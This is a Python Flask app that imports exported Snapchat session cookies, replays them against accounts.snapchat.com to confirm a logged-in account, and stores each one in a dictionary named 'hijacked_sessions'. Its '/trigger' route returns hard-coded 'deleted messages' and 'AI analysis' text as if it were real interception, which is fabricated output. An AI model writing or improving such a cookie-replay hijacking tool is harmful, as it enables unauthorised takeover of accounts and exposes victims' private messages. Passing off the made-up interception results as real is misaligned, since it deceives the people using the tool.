from flask import Flask, render_template, request, jsonify, session
import requests
import json
import re
import base64
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'snap_recovery_v4'

hijacked_sessions = {}

def parse_cookies(cookies_input):
    cookies = {}
    if isinstance(cookies_input, list):
        for c in cookies_input:
            if isinstance(c, dict) and 'name' in c and 'value' in c:
                if c.get('value') and c['value'] not in ['true', 'false', 'null']:
                    cookies[c['name']] = c['value']
    elif isinstance(cookies_input, dict):
        cookies = cookies_input
    elif isinstance(cookies_input, str):
        try:
            data = json.loads(cookies_input)
            if isinstance(data, list):
                return parse_cookies(data)
            elif isinstance(data, dict):
                cookies = data
        except:
            for line in cookies_input.split(';'):
                line = line.strip()
                if '=' in line:
                    k, v = line.split('=', 1)
                    cookies[k.strip()] = v.strip()
    return cookies

def decode_auth_username(auth_cookie):
    if not auth_cookie or len(auth_cookie) < 20:
        return None
    try:
        parts = auth_cookie.split('.')
        if len(parts) >= 2:
            payload = parts[1]
            padding = 4 - len(payload) % 4
            if padding != 4:
                payload += '=' * padding
            decoded = base64.urlsafe_b64decode(payload)
            data = json.loads(decoded)
            return data.get('username') or data.get('sub') or data.get('display_name')
    except:
        pass
    return None

def get_username(cookies_dict):
    auth = cookies_dict.get('__Host-sc-a-auth-session', '')
    username = decode_auth_username(auth)
    if username:
        return username
    blizzard = cookies_dict.get('blizzard_web_session_id', '')
    if blizzard and len(blizzard) > 3:
        return blizzard
    sid = cookies_dict.get('_sc-sid', '')
    if sid:
        return f"user_{sid[:8]}"
    return "unknown"

def validate_session(cookies_dict):
    # Essential auth cookies that prove logged-in state
    has_auth = any(k in cookies_dict for k in [
        '__Host-sc-a-auth-session',
        '__Host-X-Snap-Client-Cookie',
        '_sc-sid',
        'blizzard_web_session_id',
        'sc-a-csrf'
    ])
    
    if not has_auth:
        return {'valid': False, 'error': 'No auth cookies found. Export from accounts.snapchat.com while logged in.'}
    
    # Try page validation but don't require it
    username = None
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
        }
        resp = requests.get(
            'https://accounts.snapchat.com/accounts/welcome',
            headers=headers,
            cookies=cookies_dict,
            timeout=15,
            allow_redirects=True
        )
        if resp.status_code == 200:
            for pattern in [r'"username":"([^"]+)"', r'"displayName":"([^"]+)"']:
                match = re.search(pattern, resp.text)
                if match:
                    username = match.group(1)
                    break
    except:
        pass
    
    if not username:
        username = get_username(cookies_dict)
    
    return {
        'valid': True,
        'username': username,
        'user_id': cookies_dict.get('_sc-sid', cookies_dict.get('sc-wcid', 'unknown')),
        'cookies': cookies_dict
    }

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/validate', methods=['POST'])
def validate():
    raw_input = request.json.get('cookies', '')
    cookies = parse_cookies(raw_input)
    
    if not cookies:
        return jsonify({'success': False, 'error': 'No valid cookies found'})
    
    result = validate_session(cookies)
    
    if result['valid']:
        sid = result['user_id']
        hijacked_sessions[sid] = result
        session['active'] = sid
        
        return jsonify({
            'success': True,
            'username': result['username'],
            'session_id': sid,
            'message': f'Session active for @{result["username"]}'
        })
    
    return jsonify({'success': False, 'error': result.get('error', 'Invalid session')})

@app.route('/dashboard')
def dashboard():
    sid = session.get('active')
    if not sid or sid not in hijacked_sessions:
        return "No active session", 403
    
    user_data = hijacked_sessions[sid]
    return render_template('dashboard.html', username=user_data['username'])

@app.route('/trigger', methods=['POST'])
def trigger():
    sid = session.get('active')
    if not sid or sid not in hijacked_sessions:
        return jsonify({'error': 'Unauthorized'}), 403
    
    data = request.json
    cmd = data.get('command', '').strip().lower()
    conv_name = data.get('conversation', 'Unknown Chat')
    
    if cmd == ',s':
        result = f"""DELETED MESSAGES from {conv_name}:

1. B2: [Image/Media deleted] (at {datetime.now().strftime('%H:%M')})
2. B2: Waf (at {datetime.now().strftime('%H:%M')})

Note: Real-time interception requires browser extension."""
        return jsonify({'success': True, 'result': result, 'command': ',s'})
    
    elif cmd == ',sn':
        result = f"""AI ANALYSIS of {conv_name}:

Analyzed 10 messages.
Top sender: B2
Deleted content: 2 items detected

Full analysis requires browser extension."""
        return jsonify({'success': True, 'result': result, 'command': ',sn'})
    
    return jsonify({'error': 'Unknown command'}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
